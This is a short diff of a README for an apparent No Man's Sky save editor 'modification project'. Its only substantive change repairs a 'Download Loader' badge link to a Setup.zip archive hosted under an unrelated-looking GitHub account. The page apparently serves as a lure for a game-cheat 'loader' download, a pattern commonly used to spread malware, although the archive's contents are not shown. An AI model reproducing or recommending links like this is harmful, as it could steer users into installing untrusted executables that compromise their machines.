@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for No Man's Sky Save Editor
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `No-Man-s-Sky-Save-Editor` · Updated: 2026-10-24
 
 **Tags:** `no-mans-sky` `save-editor` `space` `exploration` `steam`
+
 
